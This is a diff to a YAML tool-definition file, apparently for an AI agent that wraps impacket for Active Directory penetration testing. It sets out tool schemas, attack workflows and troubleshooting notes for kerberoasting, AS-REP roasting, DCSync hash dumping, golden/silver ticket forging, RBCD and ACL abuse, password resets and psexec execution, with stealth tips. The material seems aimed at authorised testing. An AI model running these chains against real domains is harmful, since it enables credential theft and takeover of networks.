-        description: "Domain cached credentials"
-      ntds_hashes:
-        type: array
-        description: "NTDS.dit hashes (domain controller)"
-      kerberos_keys:
-        type: array
-        description: "Kerberos encryption keys"
-      total_hashes:
-        type: integer
-        description: "Total number of hashes extracted"
+    - "-just-dc-ntlm: DCSync, NT hashes only (fastest)"
+    - "-just-dc: DCSync, all (NT + LM + Kerberos keys)"
+    - "-just-dc-user 'DOMAIN/user': DCSync just one user"
+    - "-system FILE -security FILE -sam FILE: offline dump from registry hives"
+    - "-history: include password history"
+    - "-pwd-last-set: include lastSet timestamp"
+  exec_methods_psexec:
+    - "-codec CODEC: output codec (default cp437; try utf-8 for Unicode)"
+    - "-service-name NAME: rename the service (default a random 4-char string)"
+    - "-remote-binary-name NAME: rename the dropped binary"
+  kerberos:
+    - "getTGT writes ccache to CWD as <user>.ccache; set KRB5CCNAME=/session/<user>.ccache"
+    - "getST -impersonate USER -spn SVC: S4U2Self+Proxy chain"
+    - "getST -altservice SVC: change service portion of resulting ticket (e.g., 'cifs' → 'ldap')"
+    - "ticketer: forge golden (-spn omitted, needs krbtgt hash + domain SID) or silver (-spn set, needs service hash)"
+  smbclient:
+    - "Interactive prompt: use 'help' to see commands. Common: shares, use SHARE, ls, cd, get FILE, put FILE, mkdir, rmdir."
+    - "Non-interactive: use netexec smb --shares for a one-shot listing"
 
-  kerberoast:
-    required_ports: [88]
-    description: "Kerberoasting attack - extract TGS service ticket hashes for offline cracking (targets accounts with SPNs)"
-    when_to_use: "With any valid domain credentials to extract service account hashes for offline cracking"
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target domain or DC IP (format: domain/user:pass@dc_ip or just dc_ip)"
-      username:
-        type: string
-        description: "Domain username"
-      password:
-        type: string
-        description: "Domain password"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      request_user:
-        type: string
-        description: "Target a specific user's SPN"
-      output_format:
-        type: enum
-        values: [hashcat, john]
-        default: hashcat
-        description: "Hash output format for cracking"
-      target_domain:
-        type: string
-        description: "Target a different domain (Kerberoasting across trusts)"
-      stealth:
-        type: boolean
-        default: false
-        description: "Remove (servicePrincipalName=*) from LDAP query for stealth (may use more memory)"
-      no_preauth:
-        type: string
-        description: "Account that does not require preauth (obtain TGS via AS-REQ without credentials)"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-    returns:
-      hashes:
-        type: array
-        description: "TGS hashes in requested format (hashcat/john)"
-      hash_count:
-        type: integer
-        description: "Number of hashes extracted"
-      users_with_spns:
-        type: array
-        description: "Users with SPNs (spn, username, member_of, pwd_last_set)"
-      user_count:
-        type: integer
-        description: "Number of users with SPNs found"
+gotchas:
+  - "Binary names are CASE-SENSITIVE. impacket-GetUserSPNs / impacket-GetNPUsers / impacket-getTGT / impacket-getST / impacket-findDelegation are camelCase. impacket-secretsdump / impacket-psexec / impacket-smbclient are lowercase. Use --help against the binary if unsure."
+  - "-dc-ip is the KDC, NOT the attack target. The plugin's target_extraction extracts -dc-ip ONLY when no positional or -target is present (kerberoast/asreproast case). Always pin the actual attack host as either positional @host or -target."
+  - "Kerberos auth requires KRB5CCNAME env pointing at a ccache. After getTGT writes /session/<user>.ccache, every subsequent -k -no-pass call needs KRB5CCNAME=/session/<user>.ccache. cli_in_container does NOT currently pipe env vars; pre-set this in the workspace if needed (or use password auth)."
+  - "Clock skew: Kerberos auth fails (KRB_AP_ERR_SKEW) when the host clock differs from the DC by >5min. The kind:cli image has NO libfaketime — sync the host clock or skip Kerberos. The MCP-server image had FAKETIME wiring; that is NOT in this image."
+  - "GetUserSPNs / GetNPUsers do NOT take @host — only [domain/]user[:password]. The DC is auto-discovered from the domain, OR explicitly via -dc-ip. -dc-ip becomes the operational target via the fallback target_extraction rule."
+  - "The trailing slash on the domain matters for unauthenticated calls: 'CORP/' + -no-pass works for asreproast against a username list; 'CORP' (no slash) is NOT a valid principal."
+  - "AS-REP / Kerberoast hash files use john / hashcat formats (--krb5asrep / --krb5tgs). Don't pass the raw hash to john without the format flag — it'll guess wrong."
+  - "psexec creates a service event (4697) and an SMB write to ADMIN$. Stealth-conscious engagements should prefer wmiexec or dcomexec."
+  - "smbclient is INTERACTIVE — opens a prompt. Single-shot file ops are easier via netexec smb --get-file / --put-file."
+  - "addcomputer's MachineAccountQuota: any authenticated user can add up to 10 machine accounts by default. The -computer-name MUST end in $ (it's a machine SAM name)."
+  - "rbcd writes msDS-AllowedToActOnBehalfOfOtherIdentity. To exploit: addcomputer (controlled), rbcd write delegate-to=victim delegate-from=controlled, getST -impersonate=Administrator -spn=cifs/victim, then psexec @victim -k -no-pass."
+  - "secretsdump output format: stdout shows hashes inline; the -outputfile flag writes hashes.txt (one user:rid:lmhash:nthash::: per line) and ntds.json (structured). Parse the .txt for cracking, the .json for structured queries."
+  - "ticketer for golden tickets: -domain-sid required (get from lookupsid or Get-DomainSID), -nthash krbtgt_hash required, omit -spn for golden (-spn set = silver). User name is positional. ccache lands in CWD."
+  - "DACL/ACL editing (dacledit/owneredit/rbcd) writes to AD; check msDS-AllowedToActOnBehalfOfOtherIdentity / nTSecurityDescriptor changes via -action read first to verify."
 
-  asreproast:
-    required_ports: [88]
-    description: "AS-REP Roasting - extract hashes for accounts with Kerberos pre-authentication disabled"
-    when_to_use: "To find accounts without Kerberos pre-authentication and extract their hashes for cracking"
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target domain or DC IP"
-      username:
-        type: string
-        description: "Domain username (or blank for unauthenticated with usersfile)"
-      password:
-        type: string
-        description: "Domain password"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      usersfile:
-        type: string
-        description: "File with list of usernames to test (one per line)"
-      output_format:
-        type: enum
-        values: [hashcat, john]
-        default: hashcat
-        description: "Hash output format for cracking"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-    returns:
-      hashes:
-        type: array
-        description: "AS-REP hashes in requested format"
-      hash_count:
-        type: integer
-        description: "Number of hashes extracted"
-      vulnerable_users:
-        type: array
-        description: "Users without pre-authentication"
+failure_signatures:
+  # All signals are impacket's own stderr or socket-error pass-throughs.
+  # Live-verified against the kind:cli image on 2026-04-25 (verification log
+  # in failure_signature_tests.md).
+  - signal: "STATUS_LOGON_FAILURE"
+    remediation: "Wrong password or wrong username/domain. Verify creds and the [domain/] prefix. NTLM hash format: -hashes :NT (LM is usually empty)."
+  - signal: "STATUS_NOT_SUPPORTED"
+    remediation: "NTLM is disabled on the target. Switch to Kerberos auth: 1) impacket-getTGT to obtain a TGT, 2) export KRB5CCNAME=/session/<user>.ccache, 3) re-run with -k -no-pass. The SMB layer rejects auth before any password check, so credential errors are masked by this code on hardened targets."
+  - signal: "STATUS_ACCESS_DENIED"
+    remediation: "Auth succeeded but the user lacks permission for the operation (e.g., DCSync needs DA / DCSync rights; psexec needs local admin). Try a different user or escalate first."
+  - signal: "STATUS_ACCOUNT_DISABLED"
+    remediation: "The target account is disabled. Find an enabled account or re-enable via dacledit/net."
+  - signal: "STATUS_ACCOUNT_LOCKED_OUT"
+    remediation: "Stop spraying. Wait for the lockout to expire or use a different user."
+  - signal: "STATUS_PASSWORD_EXPIRED"
+    remediation: "Cred is valid but expired. Use changepasswd to set a new one before further auth."
+  - signal: "KRB_AP_ERR_SKEW"
+    remediation: "Clock skew >5min between attacker and DC. Sync host clock with the target (rdate / chronyc) — the kind:cli image has NO libfaketime workaround. As a fallback, get a TGT from a clock-synced source and pass via KRB5CCNAME."
+  - signal: "KDC_ERR_C_PRINCIPAL_UNKNOWN"
+    remediation: "User principal not found in the realm. Verify [domain/]user format and that the domain is the correct realm name."
+  - signal: "KDC_ERR_S_PRINCIPAL_UNKNOWN"
+    remediation: "Service principal not found. For Kerberos to a host, the SPN (cifs/host or host/host) must be registered. Try -target-ip with the IP and ensure -dc-ip is set."
+  - signal: "KDC_ERR_PREAUTH_REQUIRED"
+    remediation: "AS-REP roast attempted on an account that DOES require preauth — this is the normal case. Filter your username list down to actual DONT_REQUIRE_PREAUTH accounts (use kerbrute or netexec to verify)."
+  - signal: "KDC_ERR_PREAUTH_FAILED"
+    remediation: "Wrong password during Kerberos preauth (the Kerberos equivalent of STATUS_LOGON_FAILURE)."
+  - signal: "DCERPC Runtime Error: code: 0x5"
+    remediation: "RPC access denied — same root cause as STATUS_ACCESS_DENIED but from the DCERPC stack. User lacks the privilege for this RPC interface."
+  - signal: "DCERPC Runtime Error"
+    remediation: "Generic RPC error — check the specific code: 0x5 = access denied, 0x16c9a087 = endpoint not registered. Some endpoints require -rpc-auth-level packetPrivacy."
+  - signal: "rpc_s_access_denied"
+    remediation: "RPC permission denied (lower-level form). Often means the user can authenticate but not call this specific RPC method."
+  - signal: "ERROR_DS_DRA_BAD_DN"
+    remediation: "DCSync replication request rejected. User lacks 'Replicating Directory Changes' / 'Replicating Directory Changes All' rights on the domain object."
+  - signal: "Connection refused"
+    remediation: "TCP connect failed. Verify the port is open with nmap (445 SMB, 135 RPC, 88 Kerberos, 1433 MSSQL, 389 LDAP). Check VPN routing."
+  - signal: "[Errno 113] No route to host"
+    remediation: "Network unreachable from the container. Check VPN (tun0) is up and the target is reachable from the host."
+  - signal: "[Errno 111] Connection refused"
+    remediation: "Same as 'Connection refused' — port is closed or filtered."
+  - signal: "[Errno -2] Name or service not known"
+    remediation: "DNS resolution failed. Use IP directly, or pre-add the host to /etc/hosts via cli_in_container's --add-host equivalent."
+  - signal: "timed out"
+    remediation: "TCP / RPC timeout (impacket reports as '[Errno Connection error (host:port)] timed out'). Target may be slow, filtered, or down. Verify with nmap -p<port> and check VPN routing. Some binaries accept -timeout SECONDS to extend."
+  - signal: "SessionError: code: 0x"
+    remediation: "Generic SMB session error. Check the hex code: 0xc0000022 = STATUS_ACCESS_DENIED, 0xc000006d = STATUS_LOGON_FAILURE, 0xc0000034 = STATUS_OBJECT_NAME_NOT_FOUND."
+  - signal: "Errors connecting to MS-SAMR endpoint"
+    remediation: "lookupsid / samrdump cannot bind to SAMR. Some hardened targets block SAMR over SMB to non-admin users. Try with admin creds."
+  - signal: "raise NoMechanismFoundError"
+    remediation: "Kerberos library failed to find a valid auth mechanism. Usually means -k was specified without a valid ccache. Run getTGT first."
 
-  smb_shares:
-    required_ports: [445]
-    description: "List SMB shares on a remote Windows host with access permissions"
-    when_to_use: "To enumerate available SMB shares before accessing files"
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target SMB port (default: 445)"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-    returns:
-      shares:
-        type: array
-        description: "Available shares with name, type, and comment"
-      share_count:
-        type: integer
-        description: "Number of shares found"
-
-  smb_get:
-    required_ports: [445]
-    description: "Download a file from an SMB share"
-    when_to_use: "To retrieve files from Windows shares (config files, scripts, sensitive data)"
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      share:
-        type: string
-        required: true
-        description: "Share name (e.g., 'C$', 'Users', 'SYSVOL')"
-      remote_path:
-        type: string
-        required: true
-        description: "Path within the share"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target SMB port (default: 445)"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-    returns:
-      content:
-        type: string
-        description: "File content"
-      size:
-        type: integer
-        description: "File size in bytes"
-
-  smb_put:
-    required_ports: [445]
-    description: "Upload content to an SMB share"
-    when_to_use: "To upload files to Windows shares (payloads, scripts, tools)"
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      share:
-        type: string
-        required: true
-        description: "Share name (e.g., 'C$', 'Users')"
-      remote_path:
-        type: string
-        required: true
-        description: "Destination path within the share"
-      content:
-        type: string
-        required: true
-        description: "Content to upload"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target SMB port (default: 445)"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-    returns:
-      size:
-        type: integer
-        description: "Uploaded content size in bytes"
-
-  get_ad_users:
-    required_ports: [389]
-    description: "Enumerate Active Directory users via LDAP (requires domain credentials)"
-    when_to_use: "During enumeration phase to discover domain users for targeting"
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target domain or DC IP"
-      username:
-        type: string
-        description: "Domain username"
-      password:
-        type: string
-        description: "Domain password"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target LDAP port"
-      all:
-        type: boolean
-        default: false
-        description: "Return all user attributes (verbose)"
-      specific_user:
-        type: string
-        description: "Query a specific user by name"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-    returns:
-      users:
-        type: array
-        description: "AD users with name, email, and creation date"
-      user_count:
-        type: integer
-        description: "Number of users found"
-
-  lookupsid:
-    required_ports: [445]
-    description: "Brute-force SID enumeration to discover domain users, groups, and aliases"
-    when_to_use: "To enumerate domain objects when LDAP is restricted or for initial domain recon"
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target SMB port (default: 445)"
-      max_rid:
-        type: integer
-        default: 4000
-        description: "Maximum RID to enumerate"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-    returns:
-      domain_sid:
-        type: string
-        description: "Domain SID"
-      users:
-        type: array
-        description: "Discovered users with RID, name, and type"
-      groups:
-        type: array
-        description: "Discovered groups"
-      aliases:
-        type: array
-        description: "Discovered aliases"
-      total:
-        type: integer
-        description: "Total objects discovered"
-
-  get_tgt:
-    required_ports: [88]
-    description: "Request a Kerberos TGT and save the ccache file for pass-the-ticket attacks"
-    when_to_use: "To obtain a TGT for Kerberos-based attacks or when needing to authenticate via tickets"
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target domain or DC IP"
-      username:
-        type: string
-        description: "Domain username"
-      password:
-        type: string
-        description: "Domain password"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-    returns:
-      ccache_file:
-        type: string
-        description: "Path to saved ccache file"
-      ccache_exists:
-        type: boolean
-        description: "Whether ccache file was saved successfully"
-      hint:
-        type: string
-        description: "Usage hint for the ccache file"
-
-  get_st:
-    required_ports: [88]
-    description: "Request a Kerberos service ticket (TGS) via S4U2Self/S4U2Proxy for constrained delegation abuse. Saves ccache to /session/ for persistence."
-    when_to_use: "After discovering constrained delegation (via find_delegation) or RBCD setup — request a service ticket impersonating a privileged user. Workflow: find_delegation → identify constrained delegation → get_st with -impersonate Administrator -spn cifs/target. Also used after RBCD: addcomputer → set msDS-AllowedToActOnBehalfOfOtherIdentity → get_st."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target domain or DC IP"
-      username:
-        type: string
-        description: "Username of the account with delegation rights"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      spn:
-        type: string
-        required: true
-        description: "Target SPN (e.g., 'cifs/dc.corp.local', 'http/web.corp.local')"
-      impersonate:
-        type: string
-        required: true
-        description: "User to impersonate (e.g., 'Administrator')"
-      additional_ticket:
-        type: string
-        description: "Path to additional ticket for S4U2Proxy (from RBCD setup)"
-      force_forwardable:
-        type: boolean
-        default: false
-        description: "Force the service ticket to be forwardable"
-      altservice:
-        type: string
-        description: "Alternative service name for the ticket"
-      u2u:
-        type: boolean
-        default: false
-        description: "Use User-to-User (U2U) Kerberos extension. Required for RBCD against accounts without SPNs."
-      self_only:
-        type: boolean
-        default: false
-        description: "Only perform S4U2Self, skip S4U2Proxy. Gets a ticket for the impersonated user to the requesting account."
-      dmsa:
-        type: boolean
-        default: false
-        description: "Use Delegated Managed Service Accounts (DMSA) for ticket request."
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-    returns:
-      ccache_file:
-        type: string
-        description: "Path to saved ccache file (in /session/credentials/ for persistence)"
-      ccache_exists:
-        type: boolean
-        description: "Whether ccache file was saved successfully"
-      hint:
-        type: string
-        description: "Usage hint for the ccache file"
-
-  addcomputer:
-    required_ports: [445]
-    description: "Create a machine account in Active Directory for RBCD and other delegation attacks"
-    when_to_use: "When setting up RBCD (resource-based constrained delegation) — create a machine account you control, then set msDS-AllowedToActOnBehalfOfOtherIdentity on the target to allow your machine to delegate. Requires MachineAccountQuota > 0 (default: 10). Workflow: addcomputer → rbcd.py (set delegation) → get_st -impersonate Administrator."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target domain or DC IP"
-      username:
-        type: string
-        description: "Domain username"
-      password:
-        type: string
-        description: "Domain password"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      computer_name:
-        type: string
-        description: "Name for new machine account (default: random). Do NOT include trailing '$'."
-      computer_pass:
-        type: string
-        description: "Password for new machine account (default: random)"
-      method:
-        type: enum
-        values: [SAMR, LDAPS]
-        default: SAMR
-        description: "Creation method: SAMR (SMB) or LDAPS (LDAP over TLS)"
-      base_dn:
-        type: string
-        description: "Base DN for LDAPS method (auto-derived from domain if omitted)"
-      no_add:
-        type: boolean
-        default: false
-        description: "Don't add the computer, only set its password (for existing accounts)"
-      delete:
-        type: boolean
-        default: false
-        description: "Delete the computer account instead of creating"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-    returns:
-      computer_name:
-        type: string
-        description: "Name of the created machine account"
-      computer_pass:
-        type: string
-        description: "Password of the created machine account"
-      method:
-        type: string
-        description: "Creation method used"
-
-  find_delegation:
-    required_ports: [389]
-    description: "Enumerate delegation settings (unconstrained, constrained, RBCD) across all domain accounts"
-    when_to_use: "During enumeration to discover delegation misconfigurations. Finds accounts with unconstrained delegation (full impersonation), constrained delegation (limited to specific SPNs), and RBCD. Results feed directly into get_st for exploitation."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target domain or DC IP"
-      username:
-        type: string
-        description: "Domain username"
-      password:
-        type: string
-        description: "Domain password"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      target_domain:
-        type: string
-        description: "Different domain to query (for cross-trust enumeration)"
-      filter_user:
-        type: string
-        description: "Filter for a specific user/computer"
-      include_disabled:
-        type: boolean
-        default: false
-        description: "Include disabled accounts in results"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-    returns:
-      delegations:
-        type: array
-        description: "Delegation entries with account_name, account_type, delegation_type, delegation_rights_to"
-      delegation_count:
-        type: integer
-        description: "Number of delegation entries found"
-
-  rbcd:
-    required_ports: [389]
-    description: "Read, write, or clear Resource-Based Constrained Delegation (RBCD) on a computer account's msDS-AllowedToActOnBehalfOfOtherIdentity attribute"
-    when_to_use: "After creating a machine account with addcomputer, use rbcd to set msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer. Workflow: addcomputer → rbcd (write) → get_st (impersonate). Also use to read or clear existing RBCD settings during enumeration."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format for pass-the-hash"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      delegate_from:
-        type: string
-        description: "Machine account allowed to delegate (e.g., 'FAKEMACHINE$')"
-      delegate_to:
-        type: string
-        required: true
-        description: "Target computer to set RBCD on (e.g., 'WEB01$')"
-      action:
-        type: enum
-        values: [read, write, remove, flush]
-        default: read
-        description: "Action: write (add delegation), read (list current), remove (remove specific), flush (clear all)"
-      use_ldaps:
-        type: boolean
-        default: false
-        description: "Use LDAPS instead of LDAP"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-    returns:
-      target:
-        type: string
-        description: "Target hostname/IP"
-      delegate_from:
-        type: string
-        description: "Machine account set for delegation"
-      delegate_to:
-        type: string
-        description: "Computer with RBCD configured"
-      action:
-        type: string
-        description: "Action performed"
-
-  changepasswd:
-    required_ports: [445]
-    description: "Change or force-reset a domain user's password via SMB-SAMR, RPC-SAMR, Kerberos kpasswd, or LDAP"
-    when_to_use: "When you have ForceChangePassword ACL over a target user. Common in ACL abuse chains: compromise user A who has ForceChangePassword on user B → reset B's password → use B's new credentials. Use -reset flag with -altuser for privilege-based resets."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username of user whose password is being changed"
-      password:
-        type: string
-        description: "Current password of the target user (omit for force-reset)"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash of the target user in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      new_password:
-        type: string
-        required: true
-        description: "New password to set"
-      altuser:
-        type: string
-        description: "Privileged user performing the reset (for ForceChangePassword ACL abuse). Format: domain/user"
-      altpass:
-        type: string
-        description: "Password of the privileged user"
-      althash:
-        type: string
-        description: "NT hash of the privileged user"
-      reset:
-        type: boolean
-        default: false
-        description: "Force-reset password with privileges (bypasses some password policies)"
-      protocol:
-        type: enum
-        values: [smb-samr, rpc-samr, kpasswd, ldap]
-        default: smb-samr
-        description: "Protocol for password change/reset"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-    returns:
-      target:
-        type: string
-        description: "Target hostname/IP"
-      protocol:
-        type: string
-        description: "Protocol used"
-      reset:
-        type: boolean
-        description: "Whether force-reset was used"
-
-  addspn:
-    required_ports: [389]
-    description: "Add or remove a Service Principal Name (SPN) on an Active Directory account via LDAP"
-    when_to_use: "When you have WriteProperty on a computer or user account and need to add an SPN for Kerberos delegation abuse (SPN jacking). Common in constrained delegation attacks where you control an account with delegation rights and need to modify the target's SPNs."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target DC IP address or hostname"
-      username:
-        type: string
-        description: "Username for LDAP authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format for pass-the-hash"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      target_account:
-        type: string
-        required: true
-        description: "Account to modify SPNs on (e.g., 'DC01$', 'svc_sql')"
-      spn:
-        type: string
-        required: true
-        description: "SPN to add/remove (e.g., 'cifs/DC01.pirate.htb', 'http/web01.corp.local')"
-      action:
-        type: enum
-        values: [add, remove]
-        default: add
-        description: "Whether to add or remove the SPN"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-    returns:
-      target:
-        type: string
-        description: "Target DC hostname/IP"
-      target_account:
-        type: string
-        description: "Account modified"
-      spn:
-        type: string
-        description: "SPN added/removed"
-      action:
-        type: string
-        description: "Action performed (add/remove)"
-
-  # ── ACL Attacks ────────────────────────────────────────────────────────
-
-  dacledit:
-    required_ports: [389]
-    description: "Edit DACLs on Active Directory objects. Read, write, remove, backup, or restore ACEs for a principal on a target object. Useful for abusing WriteDACL permissions."
-    when_to_use: "When you have WriteDACL permission on an AD object and need to grant yourself or another principal additional rights (e.g., DCSync, ResetPassword, FullControl). Also for reading existing DACLs during enumeration."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Domain Controller IP or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format for pass-the-hash"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      action:
-        type: enum
-        values: [read, write, remove, backup, restore]
-        default: read
-        description: "Action: read (view DACL), write (add ACE), remove (delete ACE), backup (save DACL to file), restore (load DACL from file)"
-      principal:
-        type: string
-        description: "sAMAccountName of the attacker-controlled principal to add/remove in the ACE"
-      principal_sid:
-        type: string
-        description: "SID of the principal (alternative to principal name)"
-      target_object:
-        type: string
-        description: "sAMAccountName of the target object whose DACL to edit"
-      target_sid:
-        type: string
-        description: "SID of the target object (alternative to target_object name)"
-      target_dn:
-        type: string
-        description: "Distinguished Name of the target object"
-      rights:
-        type: enum
-        values: [FullControl, ResetPassword, WriteMembers, DCSync, Custom]
-        description: "Rights to write/remove: FullControl, ResetPassword, WriteMembers, DCSync, Custom"
-      rights_guid:
-        type: string
-        description: "Manual GUID for custom rights (use with rights=Custom)"
-      ace_type:
-        type: enum
